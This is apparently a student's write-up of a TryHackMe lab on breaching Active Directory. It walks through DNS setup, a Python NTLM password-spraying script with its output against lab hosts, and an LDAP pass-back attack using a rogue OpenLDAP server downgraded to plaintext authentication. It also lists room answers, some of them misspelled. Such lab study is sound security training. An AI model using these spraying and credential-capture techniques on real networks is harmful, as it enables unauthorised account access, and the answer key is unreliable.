# Breaching Active Directory

This particular module requires immutable to disabled on /etc/resolv.conf. If not the change of resolv-dnsmasq wont take to resolv.conf when systemctl restart dnsmasq is run:

```
Check the permissions 'i' is immutable attribute
# ls -l /etc/resolv.conf && lsattr /etc/resolv.conf
-rw-r--r-- 1 root root 21 Mar 16 11:53 /etc/resolv.conf
----i---------e------- /etc/resolv.conf

#remove immutable attribute here
# chattr -i /etc/resolv.conf 
root@ip-10-48-119-205:~# ls -l /etc/resolv.conf && lsattr /etc/resolv.conf
-rw-r--r-- 1 root root 21 Mar 16 11:53 /etc/resolv.conf
--------------e------- /etc/resolv.conf
```

Breaching Active Directory – Key Points

1. Why Active Directory Matters
- ~90% of Fortune 1000 companies use Microsoft Active Directory (AD).
- AD controls identity and access across Windows environments.
- Because it “holds the keys to the kingdom,” attackers frequently target it.

2. Goal of the Room

You learn initial access techniques to obtain any valid AD credentials (even low-privileged).
These credentials allow deeper enumeration and later exploitation.

Covered techniques include:
- NTLM-authenticated services
- LDAP bind credentials
- Authentication relays
- Microsoft Deployment Toolkit abuse
- Credential leaks in configuration files

This is not an exhaustive list—just core, common real‑world entry points.

3. Getting Connected
   
AttackBox users
- You’re auto‑connected to the network.
- You must manually configure DNS:
```
sed -i '1s|^|nameserver THMDCIP\n|' /etc/resolv-dnsmasq
systemctl restart dnsmasq
```
- Replace THMDCIP with the Domain Controller’s IP.
- DNS resets every ~3 hours; redo the command if needed.

Own machine / OpenVPN
- Download the BreachingAD VPN config.
- Connect with:
```
sudo openvpn breachingad.ovpn
```
- After “Initialization Sequence Completed,” configure DNS manually (same as above).

Kali users

Use Network Manager GUI to set DNS:
- Primary: THMDC IP
- Secondary: 1.1.1.1 (or similar)
Restart NetworkManager.

4. DNS Is Critical

Kerberos requires DNS—tickets cannot use IP addresses.
If DNS breaks, everything in AD testing breaks.

DNS Debug Checklist

1. ping <THM DC IP> – confirms network is up.
2. nslookup za.tryhackme.com <THM DC IP> – confirms DC’s DNS service works.
3. nslookup tryhackme.com – confirms your external DNS is still functional.
4. If results differ or fail → redo DNS configuration.

Common issue:
- On Kali, the AD DNS server must be first in /etc/resolv.conf.

5. Expectations
- These AD networks are medium difficulty.
- You need to be comfortable troubleshooting, especially DNS.
- If stuck, always ask: “Is my DNS working?”

#either manually include thmdc ip with nameserver line or run the 'systemctl restart dnsmasq' command 

```
root@ip-10-48-119-205:~# sudo nano /etc/resolv.conf
# here first line
# nameserver <thmdc_IP_goes_here>
#if tryhackme domain name is required to be accessed
# nameserver 8.8.8.8 

root@ip-10-48-119-205:~# nslookup thmdc
;; Got SERVFAIL reply from 10.200.70.101
Server:		10.200.70.101
Address:	10.200.70.101#53

** server can't find thmdc: SERVFAIL

root@ip-10-48-119-205:~# nslookup thmmdt.za.tryhackme.com
Server:		10.200.70.101
Address:	10.200.70.101#53

Name:	thmmdt.za.tryhackme.com
Address: 10.200.70.202

root@ip-10-48-119-205:~# nslookup za.tryhackme.com
Server:		10.200.70.101
Address:	10.200.70.101#53

Name:	za.tryhackme.com
Address: 10.200.70.101

#likely should include nameserver 1.1.1.1 or nameserver 8.8.8.8 in /etc/resolv.conf
#for external tryhackme.com
root@ip-10-48-119-205:~# nslookup tryhackme.com
;; communications error to 10.200.70.101#53: timed out
;; communications error to 10.200.70.101#53: timed out
;; communications error to 10.200.70.101#53: timed out
;; no servers could be reached

root@ip-10-48-119-205:~# ping 10.200.70.101
PING 10.200.70.101 (10.200.70.101) 56(84) bytes of data.
64 bytes from 10.200.70.101: icmp_seq=1 ttl=127 time=1.32 ms
^C
--- 10.200.70.101 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 1.312/1.342/1.390/0.034 ms
root@ip-10-48-119-205:~# 

```

## Task 2 OSINT and PHISHING

OSINT (Open Source Intelligence)

OSINT involves gathering publicly available information to uncover leaked or exposed credentials. Common sources of accidental credential exposure include:

- Users posting questions on public forums (e.g., Stack Overflow) and unintentionally revealing credentials.
- Developers uploading scripts to GitHub with hardcoded passwords.
- Employees reusing work emails on external sites that later suffer data breaches.

Platforms like HaveIBeenPwned and DeHashed help identify whether corporate emails appear in known breaches.

Even if credentials are found, they may be outdated — so attackers still need a way to validate them. Later tasks (e.g., NTLM-authenticated services) provide methods to test whether discovered credentials still work.

Phishing

Phishing remains one of the most effective ways to obtain AD credentials. Two common outcomes:

- Victims enter their credentials into a fake login page.
- Victims run a malicious file that installs a Remote Access Trojan (RAT).

A RAT runs under the user’s security context, giving the attacker immediate access to that user’s AD account. This is why phishing is a major focus for both offensive and defensive teams.

## Task 3 NTLM Authenticated Services & Password Spraying

Downloadable files one the python script below and usernames as well (first.lastname format)

### NTLM & NetNTLM Authentication

- NTLM is a suite of Microsoft authentication protocols used in Active Directory.
- NetNTLM is the challenge‑response mechanism used by NTLM. It allows applications (like OWA, VPN portals, RDP gateways, web apps) to forward authentication challenges to a Domain Controller instead of validating credentials themselves.
- This means the application acts as a middle‑man, never storing AD credentials locally.
```
+--------------------+        +--------------------+        +------------------------+
|  Application User  |        |       Server       |        |    Domain Controller   |
+--------------------+        +--------------------+        +------------------------+
          |                             |                              |
          | (1) Access request          |                              |
          +---------------------------->|                              |
          |                             |                              |
          |                             | (2) Send challenge           |
          |<----------------------------+                              |
          |                             |                              |
          | (3) Send response (NetNTLM) |                              |
          +---------------------------->|                              |
          |                             |                              |
          |                             | (4) Forward challenge        |
          |                             |     + response               |
          |                             +----------------------------->|
          |                             |                              |
          |                             |        (5) Auth result       |
          |                             |<-----------------------------+
          |                             |                              |
          | (6) Grant / deny access     |                              |
          |<----------------------------+                              |
          |                             |                              |
+--------------------+        +--------------------+        +------------------------+

```

### Why NetNTLM Matters for Attackers

Many NetNTLM‑enabled services are exposed to the internet:

- Outlook Web App (OWA)
- RDP endpoints
- VPN portals integrated with AD
- Web apps using Windows Authentication

These endpoints allow attackers to test credentials found via OSINT or phishing.

### Brute‑Force vs Password Spraying

- Full brute‑force attacks are usually impossible due to account lockout policies.

- Password spraying avoids lockouts by:
    1. Trying one password across many usernames.
    2. Useful when OSINT reveals:
       Valid usernames
       Default onboarding passwords (e.g., Changeme123)

Detection Note

Password spraying generates many failed logins and can be detected by Blue Teams.

### Provided Python Password Spraying Script
The script attempts NTLM authentication against a target URL and checks HTTP response codes:

200 OK → valid credentials

401 Unauthorized → invalid credentials

Code (unchanged):
```
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

🔧 Running the Script
Command:
```
python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a
http://ntlmauth.za.tryhackme.com
```

Parameters:
- usernames.txt → list of discovered usernames
- za.tryhackme.com → AD domain
- Changeme123 → default onboarding password
- http://ntlmauth.za.tryhackme.com → NTLM‑enabled web app

The script outputs valid credential pairs as it finds them.

```
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nano /etc/resolv-dnsmasq 
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nano /etc/resolv.conf
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nslookup thmdc.za.tryhackme.com
Server:		10.200.70.101
Address:	10.200.70.101#53

Name:	thmdc.za.tryhackme.com
Address: 10.200.70.101

root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# 
~~~
```
### Q1 Task 3: What is the name of the challenge-response authentication mechanism that uses NTLM? 

Answer: netNTML

### Q2 Task 3: What is the username of the third valid credential pair found by the password spraying script? 

Answer: Gorden.stevens

### Q3 Task 3: How many valid credentials pairs were found by the password spraying script? Answer 4

### Q4 Task 3: What is the message displayed by the web application when authenticating with a valid credential pair? Answer 'Hello World'

How to Modify the Script to Print the Success Message
Inside this block:

```
if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
    print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
    count += 1
    continue
```    
Add: (all with spaces no tabs, even if aligns causes issues with python)

```
print(response.text)
✅ Final Modified Code Block (only the changed part)
python
if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
    print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
    print (response.text)   # <-- This prints the message shown by the web app
    count += 1
    continue
```
Example of output with our answer of message from response.text
```
...
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
<html>
<head>
</head>
<body>
Hello World
</body>
</html>
[-] Failed login with Username: louise.talbot
...
```
## Task 3 LDAP Bind Credentials

LDAP Authentication & LDAP Pass‑Back Attacks

### 1. LDAP Authentication Basics

LDAP (Lightweight Directory Access Protocol) is another method applications use to authenticate against Active Directory.
Unlike NTLM/NetNTLM:

- LDAP authentication is direct — the application itself validates the user’s credentials.
- The application uses its own stored AD service account to query LDAP.
- These credentials are often stored in plaintext inside configuration files (GitLab, Jenkins, printers, VPNs, custom apps).

If such applications are exposed to the internet, attackers can:

- Brute‑force LDAP logins
- Steal stored LDAP service credentials
- Abuse misconfigurations

### 2. LDAP Pass‑Back Attack

This attack is unique to LDAP systems and not possible with Windows Authentication (NTLM).

It works when:

- You gain access to a device’s LDAP configuration (e.g., a printer’s admin panel).
- You change the LDAP server IP to your own machine.
- When the device performs a “Test Settings” check, it sends LDAP credentials to your rogue LDAP server.

This allows you to capture the LDAP service account username and password.

Printers are especially vulnerable because:

- Admin interfaces often use default credentials (admin:admin).
- LDAP passwords are hidden in the UI but still used internally.
- Devices automatically authenticate when “Test Settings” is clicked.

### 3. Why Netcat Alone Doesn’t Work

When the printer connects back, it first tries to negotiate LDAP authentication mechanisms.

If the server supports secure SASL mechanisms, the credentials:

- Are not sent in plaintext
- Or are not sent at all

Netcat cannot emulate LDAP negotiation, so the printer refuses to send credentials.

### 4. Hosting a Rogue LDAP Server

To capture plaintext credentials, you must:

- Run OpenLDAP as a rogue server.
- Downgrade its supported authentication mechanisms to only: PLAIN and LOGIN

This is done using an LDIF patch:

```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
This forces the printer to authenticate using insecure methods.

### 5. Capturing the Credentials

Once the rogue LDAP server is running:

- Click Test Settings on the printer page.
- The printer sends the LDAP bind request to your server.
- Use tcpdump to capture the plaintext credentials.

Example captured credentials (from your document):

```
za.tryhackme.com\svcLDAP
password11
```
Your actual answer was:

tryhackmeldappass1@

✔ THM Questions & Answers (from your document)
Question	Answer
### Q1 What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems? 
Answer: Pass‑back Attack

### Q2 What two authentication mechanisms do we allow?	
Answer: LOGIN, PLAIN

### Q3 What is the password associated with the svcLDAP account? 
Anwswer: tryhackmeldappass1@

